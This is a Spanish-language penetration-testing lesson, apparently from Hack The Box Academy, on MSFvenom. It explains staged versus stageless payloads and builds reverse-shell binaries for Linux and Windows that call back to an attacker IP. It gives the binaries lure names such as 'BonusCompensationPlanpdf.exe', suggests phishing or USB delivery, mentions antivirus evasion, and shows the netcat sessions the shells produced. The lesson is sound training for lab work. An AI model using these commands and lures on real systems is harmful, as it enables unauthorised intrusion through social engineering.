Debemos tener en cuenta que el uso de ataques automatizados en Metasploit requiere que lleguemos a una máquina objetivo vulnerable a través de la red. Considera lo que hicimos en la última sección. Para `run the exploit module`, `deliver the payload`, y `establish the shell session`, necesitábamos comunicarnos con el sistema en primer lugar. Esto puede haber sido posible a través de tener una presencia en la red interna o una red que tenga rutas hacia la red donde reside el objetivo. Habrá situaciones en las que no tengamos acceso directo a la red a una máquina objetivo vulnerable. En estos casos, necesitaremos ser ingeniosos en cómo se entrega y ejecuta el payload en el sistema. Una forma de hacerlo puede ser usar `MSFvenom` para crear un payload y enviarlo por correo electrónico u otros medios de ingeniería social para inducir al usuario a ejecutar el archivo.

Además de proporcionar un payload con opciones de entrega flexibles, MSFvenom también nos permite `encrypt` & `encode` los payloads para evitar las firmas de detección de antivirus comunes. Practiquemos un poco con estos conceptos.

---
## Practicing with MSFvenom

En Pwnbox o cualquier host con MSFvenom instalado, podemos emitir el comando `msfvenom -l payloads` para listar todos los payloads disponibles. A continuación, se muestran solo algunos de los payloads disponibles. Algunos payloads han sido redactados para acortar la salida y no distraer de la lección principal. Observa detenidamente los payloads y sus descripciones:

### List Payloads

```bash
msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
```

`What do you notice about the output?`

Podemos ver algunos detalles que nos ayudarán a entender los payloads más a fondo. En primer lugar, podemos ver que la convención de nomenclatura de los payloads casi siempre comienza listando el sistema operativo del objetivo (`Linux`, `Windows`, `MacOS`, `mainframe`, etc...). También podemos ver que algunos payloads se describen como (`staged`) o (`stageless`). Vamos a cubrir la diferencia.

---
## Staged vs. Stageless Payloads

Los payloads `Staged` crean una forma de enviar más componentes de nuestro ataque. Podemos pensar en ello como "preparar el escenario" para algo aún más útil. Por ejemplo, este payload `linux/x86/shell/reverse_tcp`. Cuando se ejecuta usando un exploit module en Metasploit, este payload enviará una pequeña `stage` que se ejecutará en el objetivo y luego llamará a la `attack box` para descargar el resto del payload a través de la red, luego ejecuta el shellcode para establecer una reverse shell. Por supuesto, si usamos Metasploit para ejecutar este payload, necesitaremos configurar las opciones para apuntar a las IPs y puertos correctos para que el listener capture con éxito la shell. Ten en cuenta que una stage también ocupa espacio en la memoria, lo que deja menos espacio para el payload. Lo que sucede en cada etapa podría variar dependiendo del payload.

Los payloads `Stageless` no tienen una stage. Por ejemplo, este payload `linux/zarch/meterpreter_reverse_tcp`. Usando un exploit module en Metasploit, este payload se enviará en su totalidad a través de una conexión de red sin una stage. Esto podría beneficiarnos en entornos donde no tenemos acceso a mucho ancho de banda y la latencia puede interferir. Los payloads staged podrían llevar a sesiones shell inestables en estos entornos, por lo que sería mejor seleccionar un payload stageless. Además de esto,

 los payloads stageless a veces pueden ser mejores para la evasión debido a menos tráfico pasando a través de la red para ejecutar el payload, especialmente si lo entregamos empleando ingeniería social. Este concepto también está muy bien explicado por Rapid 7 en este post del blog sobre [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

Ahora que entendemos las diferencias entre un payload staged y uno stageless, podemos identificarlos dentro de Metasploit. La respuesta es simple. El `name` te dará tu primer marcador. Toma nuestros ejemplos de arriba, `linux/x86/shell/reverse_tcp` es un payload staged, y podemos saberlo por el nombre ya que cada / en su nombre representa una etapa desde el shell hacia adelante. Entonces `/shell/` es una etapa para enviar, y `/reverse_tcp` es otra. Esto parecerá que está todo junto para un payload stageless. Toma nuestro ejemplo `linux/zarch/meterpreter_reverse_tcp`. Es similar al payload staged excepto que especifica la arquitectura que afecta, luego tiene el shell payload y las comunicaciones de red todo dentro de la misma función `/meterpreter_reverse_tcp`. Para un último ejemplo rápido de esta convención de nombres, considera estos dos `windows/meterpreter/reverse_tcp` y `windows/meterpreter_reverse_tcp`. El primero es un payload `Staged`. Nota la convención de nombres separando las etapas. El segundo es un payload `Stageless` ya que vemos el shell payload y la comunicación de red en la misma parte del nombre. Si el nombre del payload no parece del todo claro para ti, a menudo detallará si el payload es staged o stageless en la descripción.

---
## Building A Stageless Payload

Ahora construyamos un payload stageless simple con msfvenom y desglosamos el comando.

### Build It

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

### Call MSFvenom

```bash
msfvenom
```

Define la herramienta utilizada para hacer el payload.

### Creating a Payload

```bash
-p 
```

Esta `option` indica que msfvenom está creando un payload.

### Choosing the Payload based on Architecture
```bash
linux/x64/shell_reverse_tcp 
```

Especifica un payload stageless `Linux` `64-bit` que iniciará una reverse shell basada en TCP (`shell_reverse_tcp`).

### Address To Connect Back To

```bash
LHOST=10.10.14.113 LPORT=443 
```

Cuando se ejecuta, el payload llamará a la dirección IP especificada (`10.10.14.113`) en el puerto especificado (`443`).

### Format To Generate Payload In

```bash
-f elf 
```

La `-f` flag especifica el formato en el que se generará el binario. En este caso, será un [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

### Output

```bash
> createbackup.elf
```

Crea el binario .elf y nombra el archivo createbackup. Podemos nombrar este archivo como queramos. Idealmente, lo llamaríamos algo discreto y/o algo que alguien tendría la tentación de descargar y ejecutar.

---
## Executing a Stageless Payload

En este punto, tenemos el payload creado en nuestra attack box. Ahora necesitaríamos desarrollar una forma de que ese payload llegue al sistema objetivo. Hay innumerables formas en que esto se puede hacer. Aquí hay solo algunas de las formas comunes:

- Mensaje de correo electrónico con el archivo adjunto.
- Enlace de descarga en un sitio web.
- Combinado con un exploit module de Metasploit (esto probablemente requeriría que ya estemos en la red interna).
- A través de una unidad flash como parte de una prueba de penetración in situ.

Una vez que el archivo está en ese sistema, también necesitará ser ejecutado.

Imagina por un momento: la máquina objetivo es una caja Ubuntu que un administrador de TI usa para gestionar dispositivos de red (alojar scripts de configuración, acceder a routers y switches, etc.). Podríamos hacer que hicieran clic en el archivo en un correo electrónico que enviamos porque estaban usando descuidadamente este sistema como si fuera una computadora personal o estación de trabajo.

### Ubuntu Payload
![image](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)

Tendríamos un listener listo para captar la conexión en el lado de la attack box una vez ejecutado con éxito.

### NC Connection

```bash
sudo nc -lvnp 443
```

Cuando se ejecuta el archivo, vemos que hemos capturado una shell.

### Connection Established

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

Este mismo concepto se puede usar para crear payloads para varias plataformas, incluyendo Windows.

---
## Building a simple Stageless Payload for a Windows system

También podemos usar msfvenom para crear un ejecutable (`.exe`) que se puede ejecutar en un sistema Windows para proporcionar una shell.

### Windows Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

La sintaxis del comando se puede desglosar de la misma manera que hicimos anteriormente. Las únicas diferencias, por supuesto, son la `platform` (`Windows`) y el formato (`.exe`) del payload.

---

## Executing a Simple Stageless Payload On a Windows System

Esta es otra situación en la que necesitamos ser creativos para que este payload se entregue a un sistema objetivo. Sin ninguna `encoding` o `encryption`, el payload en esta forma casi con certeza sería detectado por Windows Defender AV.

![image](https://academy.hackthebox.com/storage/modules/115/winpayload.png)

Si el AV estuviera deshabilitado, todo lo que el usuario tendría que hacer es hacer doble clic en el archivo para ejecutarlo y tendríamos una sesión shell.

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```
